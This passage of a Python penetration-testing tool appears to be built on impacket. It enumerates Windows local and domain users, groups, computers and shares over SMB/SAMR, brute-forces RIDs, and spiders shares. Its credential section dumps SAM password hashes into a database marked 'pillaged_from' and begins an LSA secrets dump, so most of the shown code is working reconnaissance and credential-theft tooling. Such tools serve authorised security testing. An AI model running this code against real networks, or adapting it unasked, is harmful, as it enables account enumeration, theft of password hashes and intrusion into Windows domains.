                    resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])

                    logging.debug('Dump of hSamrOpenDomain response:')
                    if self.debug:
                        resp.dump()

                    domainHandle = resp['DomainHandle']
                    status = STATUS_MORE_ENTRIES
                    enumerationContext = 0

                    self.logger.success('Local Users enumerated on {} !'.format(self.host))
                    self.logger.highlight("   Local User Accounts")

                    while status == STATUS_MORE_ENTRIES:
                        try:
                            resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                            logging.debug('Dump of hSamrEnumerateUsersInDomain response:')
                            if self.debug:
                                resp.dump()
                        except DCERPCException as e:
                            if str(e).find('STATUS_MORE_ENTRIES') < 0:
                                raise
                            resp = e.get_packet()
                        for user in resp['Buffer']['Buffer']:
                            #users
                            r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user['RelativeId'])
                            logging.debug('Dump of hSamrOpenUser response:')
                            if self.debug:
                                r.dump()
                            # r has the clases defined here: 
                                #https://github.com/SecureAuthCorp/impacket/impacket/dcerpc/v5/samr.py #2.2.7.29 SAMPR_USER_INFO_BUFFER
                            #self.logger.results('username: {:<25}  rid: {}'.format(user['Name'], user['RelativeId']))
                            self.logger.highlight("{}\\{:<15} :{} ".format(self.hostname, user['Name'], user['RelativeId']))

                            info = samr.hSamrQueryInformationUser2(dce, r['UserHandle'],samr.USER_INFORMATION_CLASS.UserAllInformation)
                            logging.debug('Dump of hSamrQueryInformationUser2 response:')
                            if self.debug:
                                info.dump()
                            samr.hSamrCloseHandle(dce, r['UserHandle'])
                        enumerationContext = resp['EnumerationContext'] 
                        status = resp['ErrorCode']
                except Exception as e:
                    logging.debug('a {}'.format(str(e)))
                    dce.disconnect()
                    pass
            except DCERPCException:
                logging.debug('a {}'.format(str(e)))
                dce.disconnect()
                pass
        except DCERPCException as e:
            logging.debug('b {}'.format(str(e)))
            dce.disconnect()
            return list()

        self.logger.announce('Finished Checking Local Users')
        dce.disconnect()
        return list()
        


    def local_groups(self):
        """
        To enumerate local groups 
        
        Args:
            
        Raises:
            
        Returns:

        """
        groups = []
        self.logger.announce('Checking Local Groups')

        try:
            rpctransport = transport.SMBTransport(self.host, 445, r'\samr', username=self.username, password=self.password, smb_connection=self.conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('Get net localgroups Binding start')
                dce.bind(samr.MSRPC_UUID_SAMR)
                try:
                    logging.debug('Connect w/ hSamrConnect...')
                    resp = samr.hSamrConnect(dce)  

                    logging.debug('Dump of hSamrConnect response:') 
                    if self.debug:
                        resp.dump()

                    serverHandle = resp['ServerHandle'] 
                    self.logger.debug('Checking host name')
                    resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)

                    logging.debug('Dump of hSamrEnumerateDomainsInSamServer response:') 
                    if self.debug:
                        resp2.dump()

                    domains = resp2['Buffer']['Buffer']
                    tmpdomain = domains[0]['Name']
                    resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]['Name'])

                    logging.debug('Dump of hSamrLookupDomainInSamServer response:' )
                    if self.debug:
                        resp.dump()

                    resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])

                    logging.debug('Dump of hSamrOpenDomain response:')
                    if self.debug:
                        resp.dump()

                    domainHandle = resp['DomainHandle']
                    status = STATUS_MORE_ENTRIES
                    enumerationContext = 0
                    self.logger.success('Local Groups enumerated on: {}'.format(self.host))
                    self.logger.highlight("   Local Group Accounts")

                    while status == STATUS_MORE_ENTRIES:
                        try:
                            resp = samr.hSamrEnumerateGroupsInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                            logging.debug('Dump of hSamrEnumerateGroupsInDomain response:')
                            if self.debug:
                                resp.dump()
                        except DCERPCException as e:
                            if str(e).find('STATUS_MORE_ENTRIES') < 0:
                                raise
                            resp = e.get_packet()
                        for group in resp['Buffer']['Buffer']:
                            gid = group['RelativeId']
                            r = samr.hSamrOpenGroup(dce, domainHandle, groupId=gid)
                            logging.debug('Dump of hSamrOpenUser response:')
                            if self.debug:
                                r.dump()
                            info = samr.hSamrQueryInformationGroup(dce, r['GroupHandle'],samr.GROUP_INFORMATION_CLASS.GroupGeneralInformation)
                            #info response object (SAMPR_GROUP_GENERAL_INFORMATION) defined in  impacket/samr.py # 2.2.5.7 SAMPR_GROUP_INFO_BUFFER
                            logging.debug('Dump of hSamrQueryInformationGroup response:')
                            if self.debug:
                                info.dump()
                            #self.logger.results('Groupname: {:<30}  membercount: {}'.format(group['Name'], info['Buffer']['General']['MemberCount']))
                            self.logger.highlight('Group: {:<20}  membercount: {}'.format(group['Name'], info['Buffer']['General']['MemberCount']))
                            print('')

                            groupResp = samr.hSamrGetMembersInGroup(dce, r['GroupHandle'])
                            logging.debug('Dump of hSamrGetMembersInGroup response:')
                            if self.debug:
                                groupResp.dump()

                            for member in groupResp['Members']['Members']:
                                m = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, member)
                                guser = samr.hSamrQueryInformationUser2(dce, m['UserHandle'], samr.USER_INFORMATION_CLASS.UserAllInformation)
                                self.logger.highlight('{}\\{:<30}  '.format(tmpdomain, guser['Buffer']['All']['UserName']))
                                
                                logging.debug('Dump of hSamrQueryInformationUser2 response:')
                                if self.debug:
                                    guser.dump()

                            samr.hSamrCloseHandle(dce, r['GroupHandle'])
                        enumerationContext = resp['EnumerationContext'] 
                        status = resp['ErrorCode']
                except Exception as e:
                    logging.debug('a {}'.format(str(e)))
                    dce.disconnect()
                    pass
            except DCERPCException:
                logging.debug('a {}'.format(str(e)))
                dce.disconnect()
                pass
        except DCERPCException as e:
                logging.debug('b {}'.format(str(e)))
                dce.disconnect()
                return list()

        self.logger.announce('Finished Checking Local Groups')
        dce.disconnect()
        return list()


    def rid_brute(self, maxRid=None):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        entries = []
        self.logger.announce('Starting RID Brute')
        if not maxRid:
            maxRid = int(self.args.rid_brute)

        KNOWN_PROTOCOLS = {
            135: {'bindstr': r'ncacn_ip_tcp:%s',           'set_host': False},
            139: {'bindstr': r'ncacn_np:{}[\pipe\lsarpc]', 'set_host': True},
            445: {'bindstr': r'ncacn_np:{}[\pipe\lsarpc]', 'set_host': True},
            }

        try:
            stringbinding = KNOWN_PROTOCOLS[self.args.port]['bindstr'].format(self.host)
            logging.debug('StringBinding {}'.format(stringbinding))
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(self.args.port)

            if KNOWN_PROTOCOLS[self.args.port]['set_host']:
                rpctransport.setRemoteHost(self.host)

            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash)

            dce = rpctransport.get_dce_rpc()
            dce.connect()
        except Exception as e:
            self.logger.error('Error creating DCERPC connection: {}'.format(e))
            return entries

        # Want encryption? Uncomment next line
        # But make SIMULTANEOUS variable <= 100
        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)

        # Want fragmentation? Uncomment next line
        #dce.set_max_fragment_size(32)

        self.logger.debug('Brute forcing RIDs')
        dce.bind(lsat.MSRPC_UUID_LSAT)
        resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']

        resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle, lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)

        domainSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()

        soFar = 0
        SIMULTANEOUS = 1000
        self.logger.highlight("   RID Information")
        for j in range(maxRid//SIMULTANEOUS+1):
            if (maxRid - soFar) // SIMULTANEOUS == 0:
                sidsToCheck = (maxRid - soFar) % SIMULTANEOUS
            else:
                sidsToCheck = SIMULTANEOUS

            if sidsToCheck == 0:
                break

            sids = list()
            for i in range(soFar, soFar+sidsToCheck):
                sids.append(domainSid + '-%d' % i)
            try:
                lsat.hLsarLookupSids(dce, policyHandle, sids,lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
            except DCERPCException as e:
                if str(e).find('STATUS_NONE_MAPPED') >= 0:
                    soFar += SIMULTANEOUS
                    continue
                elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
                    resp = e.get_packet()
                else:
                    raise

            for n, item in enumerate(resp['TranslatedNames']['Names']):
                if item['Use'] != SID_NAME_USE.SidTypeUnknown:
                    rid    = soFar + n
                    domain = resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name']
                    user   = item['Name']
                    sid_type = SID_NAME_USE.enumItems(item['Use']).name
                    self.logger.highlight("{}\\{:<15} :{} ({})".format(domain, user, rid, sid_type))
                    entries.append({'rid': rid, 'domain': domain, 'username': user, 'sidtype': sid_type})

            soFar += SIMULTANEOUS

        dce.disconnect()
        self.logger.announce('Finished RID brute')
        return entries


    def spider(self, share=None, folder='.', pattern=[], regex=[], exclude_dirs=[], depth=None, content=False, onlyfiles=True):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        self.logger.announce('Starting Spider')
        spider = SMBSpider(self.conn, self.logger)

        self.logger.info('Started spidering')
        start_time = time()
        if not share:
            spider.spider(self.args.spider, self.args.spider_folder, self.args.pattern,
                          self.args.regex, self.args.exclude_dirs, self.args.depth,
                          self.args.content, self.args.only_files)
        else:
            spider.spider(share, folder, pattern, regex, exclude_dirs, depth, content, onlyfiles)

        self.logger.info("Done spidering (Completed in {})".format(time() - start_time))

        self.logger.announce('Finished Spidering')
        return spider.results



###############################################################################

     #     # ####### #######        ####### #     # #     # #     # 
     ##    # #          #           #       ##    # #     # ##   ## 
     # #   # #          #           #       # #   # #     # # # # # 
     #  #  # #####      #    #####  #####   #  #  # #     # #  #  # 
     #   # # #          #           #       #   # # #     # #     # 
     #    ## #          #           #       #    ## #     # #     # 
     #     # #######    #           ####### #     #  #####  #     # 


###############################################################################
###############################################################################
#   Network/Domain Enum functions
#
# This section:
#   shares
#   pass_pol
#   groups
#   users
#   computers
#
###############################################################################

    def shares(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        temp_dir = ntpath.normpath("\\" + gen_random_string())
        permissions = []
        self.logger.announce('Starting Share Enumeration')

        try:
            for share in self.conn.listShares():
                share_name = share['shi1_netname'][:-1]
                share_remark = share['shi1_remark'][:-1]
                share_info = {'name': share_name, 'remark': share_remark, 'access': []}
                read = False
                write = False

                try:
                    self.conn.listPath(share_name, '*')
                    read = True
                    share_info['access'].append('READ')
                except SessionError:
                    pass

                try:
                    self.conn.createDirectory(share_name, temp_dir)
                    self.conn.deleteDirectory(share_name, temp_dir)
                    write = True
                    share_info['access'].append('WRITE')
                except SessionError:
                    pass

                permissions.append(share_info)
                #self.db.add_share(hostid, share_name, share_remark, read, write)

            #self.logger.debug('Enumerated shares')
            self.logger.success('Shares enumerated on: {}'.format(self.host))

            self.logger.highlight('{:<15} {:<15} {}'.format('Share', 'Permissions', 'Remark'))
            self.logger.highlight('{:<15} {:<15} {}'.format('-----', '-----------', '------'))
            for share in permissions:
                name   = share['name']
                remark = share['remark']
                perms  = share['access']

                self.logger.highlight('{:<15} {:<15} {}'.format(name, ','.join(perms), remark))

        except Exception as e:
            self.logger.error('Error enumerating shares: {}'.format(e))

        self.logger.announce('Finished Share Enumeration')
        return permissions



    def pass_pol(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        return PassPolDump(self).dump()



    @requires_dc
    def groups(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """

        if self.args.groups: targetGroup = self.args.groups
        groupFound = False
        users = []
        self.logger.announce('Starting Domain Group Enum')

        try:
            rpctransport = transport.SMBTransport(self.dc_ip, 445, r'\samr', username=self.username, password=self.password, domain=self.domain)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('Get net groups Binding start')
                dce.bind(samr.MSRPC_UUID_SAMR)
                try:
                    logging.debug('Connect w/ hSamrConnect...')
                    resp = samr.hSamrConnect(dce)  
                    logging.debug('Dump of hSamrConnect response:') 
                    if self.debug:
                        resp.dump()
                    serverHandle = resp['ServerHandle'] 

                    self.logger.debug('Looking up reachable domain(s)')
                    resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
                    logging.debug('Dump of hSamrEnumerateDomainsInSamServer response:') 
                    if self.debug:
                        resp2.dump()

                    domains = resp2['Buffer']['Buffer']
                    tmpdomain = domains[0]['Name']

                    logging.debug('Looking up groups in domain: '+ domains[0]['Name'])
                    resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]['Name'])
                    logging.debug('Dump of hSamrLookupDomainInSamServer response:' )
                    if self.debug:
                        resp.dump()

                    resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
                    logging.debug('Dump of hSamrOpenDomain response:')
                    if self.debug:
                        resp.dump()

                    domainHandle = resp['DomainHandle']

                    status = STATUS_MORE_ENTRIES
                    enumerationContext = 0

                    self.logger.success('Domain Groups enumerated')
                    self.logger.highlight("    {} Domain Group Accounts".format(tmpdomain))

                    while status == STATUS_MORE_ENTRIES:
                        try:
                            resp = samr.hSamrEnumerateGroupsInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                            logging.debug('Dump of hSamrEnumerateGroupsInDomain response:')
                            if self.debug:
                                resp.dump()

                        except DCERPCException as e:
                            if str(e).find('STATUS_MORE_ENTRIES') < 0:
                                raise
                            resp = e.get_packet()

                        for group in resp['Buffer']['Buffer']:
                            gid = group['RelativeId']
                            r = samr.hSamrOpenGroup(dce, domainHandle, groupId=gid)
                            logging.debug('Dump of hSamrOpenUser response:')
                            if self.debug:
                                r.dump()

                            info = samr.hSamrQueryInformationGroup(dce, r['GroupHandle'],samr.GROUP_INFORMATION_CLASS.GroupGeneralInformation)
                            #info response object (SAMPR_GROUP_GENERAL_INFORMATION) defined in  impacket/samr.py # 2.2.5.7 SAMPR_GROUP_INFO_BUFFER

                            logging.debug('Dump of hSamrQueryInformationGroup response:')
                            if self.debug:
                                info.dump()

                            #self.logger.results('Groupname: {:<30}  membercount: {}'.format(group['Name'], info['Buffer']['General']['MemberCount']))
                            print('')
                            self.logger.highlight('{:<30}  membercount: {}'.format(group['Name'], info['Buffer']['General']['MemberCount']))


                            groupResp = samr.hSamrGetMembersInGroup(dce, r['GroupHandle'])
                            logging.debug('Dump of hSamrGetMembersInGroup response:')
                            if self.debug:
                                groupResp.dump()

                            for member in groupResp['Members']['Members']:
                                m = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, member)
                                guser = samr.hSamrQueryInformationUser2(dce, m['UserHandle'], samr.USER_INFORMATION_CLASS.UserAllInformation)
                                self.logger.highlight('{}\\{:<30}  '.format(tmpdomain, guser['Buffer']['All']['UserName']))
                                
                                logging.debug('Dump of hSamrQueryInformationUser2 response:')
                                if self.debug:
                                    guser.dump()


                            samr.hSamrCloseHandle(dce, r['GroupHandle'])

                        enumerationContext = resp['EnumerationContext'] 
                        status = resp['ErrorCode']

                except Exception as e:
                    logging.debug('a {}'.format(str(e)))
                    dce.disconnect()
                    pass
            except DCERPCException:
                logging.debug('a {}'.format(str(e)))
                dce.disconnect()
                pass
        except DCERPCException as e:
            logging.debug('b {}'.format(str(e)))
            dce.disconnect()
            return list()

        try:
            dce.disconnect()
        except:
            pass

        self.logger.announce('Finished Domain Group Enum')
        return list()


    @requires_dc
    def users(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        users = []
        self.logger.announce('Starting Domain Users Enum')

        try:
            rpctransport = transport.SMBTransport(self.dc_ip, 445, r'\samr', username=self.username, password=self.password)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('NetUsers Binding start')
                dce.bind(samr.MSRPC_UUID_SAMR)
                try:
                    logging.debug('Connect w/ hSamrConnect...')
                    resp = samr.hSamrConnect(dce)  
                    logging.debug('Dump of hSamrConnect response:') 
                    if self.debug:
                        resp.dump()
                    serverHandle = resp['ServerHandle'] 

                    self.logger.debug('Looking up domain name(s)')
                    resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
                    logging.debug('Dump of hSamrEnumerateDomainsInSamServer response:') 
                    if self.debug:
                        resp2.dump()

                    domains = resp2['Buffer']['Buffer']
                    tmpdomain = domains[0]['Name']

                    self.logger.debug('Looking up users in domain:'+ domains[0]['Name'])
                    resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]['Name'])
                    logging.debug('Dump of hSamrLookupDomainInSamServer response:' )
                    if self.debug:
                        resp.dump()

                    resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
                    logging.debug('Dump of hSamrOpenDomain response:')
                    if self.debug:
                        resp.dump()

                    domainHandle = resp['DomainHandle']

                    status = STATUS_MORE_ENTRIES
                    enumerationContext = 0

                    self.logger.success('Domain Users enumerated')
                    self.logger.highlight("     {} Domain User Accounts".format(tmpdomain))
                    while status == STATUS_MORE_ENTRIES:
                        try:
                            resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                            logging.debug('Dump of hSamrEnumerateUsersInDomain response:')
                            if self.debug:
                                resp.dump()

                        except DCERPCException as e:
                            if str(e).find('STATUS_MORE_ENTRIES') < 0:
                                raise
                            resp = e.get_packet()


                        for user in resp['Buffer']['Buffer']:
                            #users
                            r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user['RelativeId'])
                            logging.debug('Dump of hSamrOpenUser response:')
                            if self.debug:
                                r.dump()

                            # r has the clases defined here: 
                                #https://github.com/SecureAuthCorp/impacket/impacket/dcerpc/v5/samr.py #2.2.7.29 SAMPR_USER_INFO_BUFFER
                            #self.logger.results('username: {:<25}  rid: {}'.format(user['Name'], user['RelativeId']))
                            self.logger.highlight('{}\\{:<20}  rid: {}'.format(tmpdomain, user['Name'], user['RelativeId']))

                            info = samr.hSamrQueryInformationUser2(dce, r['UserHandle'], samr.USER_INFORMATION_CLASS.UserAllInformation)
                            logging.debug('Dump of hSamrQueryInformationUser2 response:')
                            if self.debug:
                                info.dump()
                            samr.hSamrCloseHandle(dce, r['UserHandle'])

                        enumerationContext = resp['EnumerationContext'] 
                        status = resp['ErrorCode']

                except Exception as e:
                    logging.debug('a {}'.format(str(e)))
                    dce.disconnect()
                    pass
            except DCERPCException:
                logging.debug('a {}'.format(str(e)))
                dce.disconnect()
                pass
        except DCERPCException as e:
            logging.debug('b {}'.format(str(e)))
            dce.disconnect()
            return list()

        try:
            dce.disconnect()
        except:
            pass
        self.logger.announce('Finished Domain Users Enum')
        return list()

    @requires_dc
    def computers(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        comps = []
        self.logger.announce('Starting Domain Computers Enum')

        try:
            rpctransport = transport.SMBTransport(self.dc_ip, 445, r'\samr', username=self.username, password=self.password)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('NetUsers Binding start')
                dce.bind(samr.MSRPC_UUID_SAMR)
                try:
                    logging.debug('Connect w/ hSamrConnect...')
                    resp = samr.hSamrConnect(dce)  
                    logging.debug('Dump of hSamrConnect response:') 
                    if self.debug:
                        resp.dump()
                    serverHandle = resp['ServerHandle'] 

                    self.logger.debug('Looking up domain name(s)')
                    resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
                    logging.debug('Dump of hSamrEnumerateDomainsInSamServer response:') 
                    if self.debug:
                        resp2.dump()

                    domains = resp2['Buffer']['Buffer']
                    tmpdomain = domains[0]['Name']

                    self.logger.debug('Looking up users in domain:'+ domains[0]['Name'])
                    resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]['Name'])
                    logging.debug('Dump of hSamrLookupDomainInSamServer response:' )
                    if self.debug:
                        resp.dump()

                    resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
                    logging.debug('Dump of hSamrOpenDomain response:')
                    if self.debug:
                        resp.dump()

                    domainHandle = resp['DomainHandle']

                    status = STATUS_MORE_ENTRIES
                    enumerationContext = 0

                    while status == STATUS_MORE_ENTRIES:
                        try:
                            #need one for workstations and second gets the DomainControllers
                            respComps = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, samr.USER_WORKSTATION_TRUST_ACCOUNT, enumerationContext=enumerationContext)
                            respServs = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, samr.USER_SERVER_TRUST_ACCOUNT, enumerationContext=enumerationContext)
                            
                            logging.debug('Dump of hSamrEnumerateUsersInDomain Comps response:')
                            if self.debug:
                                respComps.dump()
                            logging.debug('Dump of hSamrEnumerateUsersInDomain Servs response:')
                            if self.debug:
                                respServs.dump()

                        except DCERPCException as e:
                            if str(e).find('STATUS_MORE_ENTRIES') < 0:
                                raise
                            resp = e.get_packet()


                        self.logger.success('Domain Controllers enumerated')
                        self.logger.highlight("      {} Domain Controllers".format(tmpdomain))
                        for user in respServs['Buffer']['Buffer']:
                            #servers
                            r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user['RelativeId'])
                            logging.debug('Dump of hSamrOpenUser response:')
                            if self.debug:
                                r.dump()

                            # r has the clases defined here: 
                                #https://github.com/SecureAuthCorp/impacket/impacket/dcerpc/v5/samr.py #2.2.7.29 SAMPR_USER_INFO_BUFFER

                            self.logger.highlight('{:<23} rid: {}'.format(user['Name'], user['RelativeId']))
                            info = samr.hSamrQueryInformationUser2(dce, r['UserHandle'],samr.USER_INFORMATION_CLASS.UserAllInformation)
                            logging.debug('Dump of hSamrQueryInformationUser2 response:')
                            if self.debug:
                                info.dump()
                            samr.hSamrCloseHandle(dce, r['UserHandle'])

                        print('')
                        self.logger.success('Domain Computers enumerated')
                        self.logger.highlight("      {} Domain Computer Accounts".format(tmpdomain))
                        for user in respComps['Buffer']['Buffer']:
                            #workstations
                            r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user['RelativeId'])
                            logging.debug('Dump of hSamrOpenUser response:')
                            if self.debug:
                                r.dump()

                            # r has the clases defined here: 
                                #https://github.com/SecureAuthCorp/impacket/impacket/dcerpc/v5/samr.py #2.2.7.29 SAMPR_USER_INFO_BUFFER

                            #self.logger.results('Computername: {:<25}  rid: {}'.format(user['Name'], user['RelativeId']))
                            self.logger.highlight('{:<23} rid: {}'.format(user['Name'], user['RelativeId']))
                            info = samr.hSamrQueryInformationUser2(dce, r['UserHandle'],samr.USER_INFORMATION_CLASS.UserAllInformation)
                            logging.debug('Dump of hSamrQueryInformationUser2 response:')
                            if self.debug:
                                info.dump()
                            samr.hSamrCloseHandle(dce, r['UserHandle'])


                        enumerationContext = resp['EnumerationContext'] 
                        status = resp['ErrorCode']

                except Exception as e:
                    logging.debug('a {}'.format(str(e)))
                    dce.disconnect()
                    pass
            except DCERPCException:
                logging.debug('a {}'.format(str(e)))
                dce.disconnect()
                pass
        except DCERPCException as e:
            logging.debug('b {}'.format(str(e)))
            dce.disconnect()
            return list()

        self.logger.announce('Finished Domain Computer Enum')
        return list()


    @requires_dc
    def group(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        targetGroup = self.args.group
        groupFound = False
        users = []
        if targetGroup == '':
            self.logger.error("Must specify a group name after --group ")
        self.logger.announce('Starting Domain Group Enum')

        try:
            rpctransport = transport.SMBTransport(self.dc_ip, 445, r'\samr', username=self.username, password=self.password, domain=self.domain)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('Get net groups Binding start')
                dce.bind(samr.MSRPC_UUID_SAMR)
                try:
                    logging.debug('Connect w/ hSamrConnect...')
                    resp = samr.hSamrConnect(dce)  
                    logging.debug('Dump of hSamrConnect response:') 
                    if self.debug:
                        resp.dump()
                    serverHandle = resp['ServerHandle'] 

                    self.logger.debug('Looking up reachable domain(s)')
                    resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
                    logging.debug('Dump of hSamrEnumerateDomainsInSamServer response:') 
                    if self.debug:
                        resp2.dump()

                    domains = resp2['Buffer']['Buffer']
                    tmpdomain = domains[0]['Name']

                    logging.debug('Looking up groups in domain: '+ domains[0]['Name'])
                    resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]['Name'])
                    logging.debug('Dump of hSamrLookupDomainInSamServer response:' )
                    if self.debug:
                        resp.dump()

                    resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
                    logging.debug('Dump of hSamrOpenDomain response:')
                    if self.debug:
                        resp.dump()

                    domainHandle = resp['DomainHandle']

                    status = STATUS_MORE_ENTRIES
                    enumerationContext = 0

                    self.logger.success('Domain Groups enumerated')

                    while status == STATUS_MORE_ENTRIES:
                        try:
                            resp = samr.hSamrEnumerateGroupsInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                            logging.debug('Dump of hSamrEnumerateGroupsInDomain response:')
                            if self.debug:
                                resp.dump()

                        except DCERPCException as e:
                            if str(e).find('STATUS_MORE_ENTRIES') < 0:
                                raise
                            resp = e.get_packet()


                        for group in resp['Buffer']['Buffer']:
                            gid = group['RelativeId']
                            r = samr.hSamrOpenGroup(dce, domainHandle, groupId=gid)
                            logging.debug('Dump of hSamrOpenUser response:')
                            if self.debug:
                                r.dump()

                            info = samr.hSamrQueryInformationGroup(dce, r['GroupHandle'],samr.GROUP_INFORMATION_CLASS.GroupGeneralInformation)
                            #info response object (SAMPR_GROUP_GENERAL_INFORMATION) defined in  impacket/samr.py # 2.2.5.7 SAMPR_GROUP_INFO_BUFFER

                            logging.debug('Dump of hSamrQueryInformationGroup response:')
                            if self.debug:
                                info.dump()

                            if group['Name'] == targetGroup:
                                self.logger.success('\"{}\" Domain Group Found in {}'.format(targetGroup, tmpdomain))
                                self.logger.highlight("    \"{}\" Group Info".format(targetGroup))
                                groupFound = True
                                print('')
                                self.logger.highlight('{:<30}  membercount: {}'.format(group['Name'], info['Buffer']['General']['MemberCount']))

                                groupResp = samr.hSamrGetMembersInGroup(dce, r['GroupHandle'])
                                logging.debug('Dump of hSamrGetMembersInGroup response:')
                                if self.debug:
                                    groupResp.dump()

                                for member in groupResp['Members']['Members']:
                                    m = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, member)
                                    guser = samr.hSamrQueryInformationUser2(dce, m['UserHandle'], samr.USER_INFORMATION_CLASS.UserAllInformation)
                                    self.logger.highlight('{}\\{:<30}  '.format(tmpdomain, guser['Buffer']['All']['UserName']))
                                
                                    logging.debug('Dump of hSamrQueryInformationUser2 response:')
                                    if self.debug:
                                        guser.dump()

                            if groupFound == False:
                                self.logger.error("Group not found")



                            samr.hSamrCloseHandle(dce, r['GroupHandle'])

                        enumerationContext = resp['EnumerationContext'] 
                        status = resp['ErrorCode']


                except Exception as e:
                    logging.debug('a {}'.format(str(e)))
                    dce.disconnect()
                    pass
            except DCERPCException:
                logging.debug('a {}'.format(str(e)))
                dce.disconnect()
                pass
        except DCERPCException as e:
            logging.debug('b {}'.format(str(e)))
            dce.disconnect()
            return list()

        try:
            dce.disconnect()
        except:
            pass

        self.logger.announce('Finished Domain Group Enum')
        return list()



##############################################################################

######  #     # #     # ######      #####  ######  ####### ######   #####  
#     # #     # ##   ## #     #    #     # #     # #       #     # #     # 
#     # #     # # # # # #     #    #       #     # #       #     # #       
#     # #     # #  #  # ######     #       ######  #####   #     #  #####  
#     # #     # #     # #          #       #   #   #       #     #       # 
#     # #     # #     # #          #     # #    #  #       #     # #     # 
######   #####  #     # #           #####  #     # ####### ######   ##### 

##############################################################################
####################################################################################
#   Extracting Creds functions
#
# This section:
#   sam
#   lsa
#   ntds
#
####################################################################################

    @requires_admin
    def sam(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        self.logger.announce('Dumping SAM hashes on {}'.format(self.host))

        self.enable_remoteops()
        host_id = self.db.get_computers(filterTerm=self.host)[0][0]

        def add_sam_hash(sam_hash, host_id):
            add_sam_hash.sam_hashes += 1
            self.logger.highlight(sam_hash)
            username,_,lmhash,nthash,_,_,_ = sam_hash.split(':')
            self.db.add_credential('hash', self.hostname, username, ':'.join((lmhash, nthash)), pillaged_from=host_id)
        add_sam_hash.sam_hashes = 0

        if self.remote_ops and self.bootkey:
            #try:
            SAMFileName = self.remote_ops.saveSAM()
            self.logger.success('SAM hashes dump:')
            SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: add_sam_hash(secret, host_id))

            #self.logger.announce('Dumping SAM hashes')
            SAM.dump()
            SAM.export(self.output_filename)

            self.logger.success('Added {} SAM hashes to the database'.format(highlight(add_sam_hash.sam_hashes)))
            self.logger.success('Saved {} hashes to {}.sam'.format(highlight(add_sam_hash.sam_hashes),
                                                                             self.output_filename))

            #except Exception as e:
                #self.logger.error('SAM hashes extraction failed: {}'.format(e))

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            SAM.finish()

    @requires_admin
    def lsa(self):
        """

        Some reading on DCC2 ~ cached credentials.
        -https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v%3Dws.11)#windows-logon-cached-password-verifiers
        -https://support.microsoft.com/en-us/help/913485/cached-credentials-security-in-windows-server-2003-in-windows-xp-and-i
            tldr; 
            DCC's are password "verifiers" used to locally verify a password is good. 
            These cant be used (passed) to other machines as they are not really a password.
        
        Args:
            
        Raises:
            
        Returns:

        """
        
        self.logger.announce('Dumping LSA Secrets on {}'.format(self.host))
